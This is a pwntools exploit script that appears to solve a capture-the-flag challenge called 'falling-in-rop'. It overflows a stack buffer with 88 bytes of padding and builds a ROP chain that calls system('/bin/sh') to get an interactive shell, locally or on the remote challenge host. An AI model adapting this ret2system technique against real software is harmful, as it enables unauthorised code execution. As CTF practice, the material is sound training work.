import logging

from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
b*vuln
continue
'''


def start():
    if args.QEMU and args.GDB:
        p = process(['qemu-amd64', '-g', '1234', e.path])
        gdb.attach(target=('localhost', 1234), exe=e.path, gdbscript=gs)
        return p
    elif (args.QEMU):
        return process(['qemu-amd64', e.path])
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("spaceheroes-falling-in-rop.chals.io", 443, ssl=True, sni="spaceheroes-falling-in-rop.chals.io")
    else:
        return process(e.path)

# they wanted simple ROP
p = start()
chain = cyclic(88)
chain += p64(0x004011cd)
chain += p64(next(e.search(b'/bin/sh')))
chain += p64(r.find_gadget(['ret'])[0])
chain += p64(e.sym['system'])
p.sendline(chain)

p.interactive()